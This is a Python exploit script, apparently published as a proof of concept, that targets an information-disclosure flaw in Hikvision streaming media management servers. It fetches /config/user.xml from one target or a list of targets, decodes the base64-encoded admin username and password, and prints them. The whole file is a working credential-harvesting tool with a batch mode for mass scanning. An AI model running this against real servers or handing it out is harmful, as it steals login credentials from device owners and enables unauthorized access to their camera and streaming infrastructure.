#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import urllib3
import sys
from bs4 import BeautifulSoup
import base64
urllib3.disable_warnings()

def title():
    print("""
                        Hikvision流媒体管理服务器敏感信息泄漏
                      use: python3  HikvisionInformation.py
                                 Author: Henry4E36
    """)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file


    def target_url(self):
        target_url = self.url + "/config/user.xml"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
        }

        try:
            res = requests.get(url=target_url,headers=headers,verify=False,timeout=5)
            soup = BeautifulSoup(res.text, features="html.parser")
            name_base64 = soup.user.get("name")
            passwd_base64 = soup.user.get("password")
            # 对base64编码进行解码
            name = base64.b64decode(name_base64).decode()
            passwd = base64.b64decode(passwd_base64).decode()
            if ("password" and "name" in res.text) and res.status_code == 200:
                print("[--------------------------------------------------------------------]")
                print(f"\033[31m[!]  站点:{self.url}存在敏感信息泄漏")
                print(f"[!]  name = {name}   password = {passwd}\033[0m")
                print("[--------------------------------------------------------------------]")
        except Exception as e:
            print("[--------------------------------------------------------------------]")
            print(f"[-] 站点: {self.url}连接错误")
            print("[--------------------------------------------------------------------]")

    def file_url(self):
        with open(f"{self.file}","r") as urls:
            for url in urls:
                # 防止误操作存在空格了
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                # 去除空格
                self.url = url.strip()
                information.target_url(self)
        urls.close()

if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="HiKvision Information Options")
    parser.add_argument("-u", "--url", metavar="url", type=str, help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print("[-]  参数错误！\neg1:>>>python3 HikvisionInformation.py -u http://127.0.0.1\neg2:>>>python3 HikvisionInformation.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
